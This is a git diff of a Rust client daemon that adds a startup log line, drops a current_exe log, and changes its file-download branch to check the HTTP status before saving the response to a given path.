@@ -14,7 +14,6 @@ use reqwest;
 #[cfg(unix)]
 use libc;
 use std::env;
-use std::env::current_exe;
 use std::process;
 use tokio::time::{sleep, Duration};
 
@@ -179,11 +178,11 @@ fn custom_format(
 }
 
 async fn daemon_loop(args: &Args) {
+    info!("Application starting with args: {:?}", args);
     info!("WS Server: {}", args.ws_server);
     info!("Client ID: {}", args.client_id);
     info!("Config ID: {}", args.config_id);
     info!("Client Server: {}", args.config_server);
-
     let mut client_id = args.client_id.clone();
     let mut ws_server = args.ws_server.clone();
 
@@ -320,7 +319,6 @@ async fn main() {
     } else if args.daemon {
         run_daemon(&args);
     } else if !args.download_url.is_empty() && !args.save_path.is_empty() {
-        info!("{}", &format!("current_exe: {}", current_exe().unwrap().display()));
         let res = match reqwest::get(&args.download_url).await {
             Ok(res) => res,
             Err(e) => {
@@ -332,20 +330,16 @@ async fn main() {
         info!("Response: {:?} {}", res.version(), res.status());
         info!("Headers: {:#?}\n", res.headers());
 
-        let body = match res.bytes().await {
-            Ok(body) => body,
-            Err(e) => {
-                error!("[-] Failed to read response body: {}", e);
-                exit(1)
-            }
-        };
-
-        if let Err(e) = fs::write(&args.save_path, body) {
+        if !res.status().is_success() {
+            error!("[-] Failed to download: received status {}", res.status());
+            exit(1);
+        }
+        if let Err(e) = fs::write(&args.save_path, res.bytes().await.unwrap()) {
             error!("[-] Failed to write to {}: {}", &args.save_path, e);
             exit(1);
         }
+        info!("Saved! {:#?}\n", args.save_path);
 
-        info!("Saved to {} successfully!", &args.save_path);
     } else {
         daemon_loop(&args).await;
     }
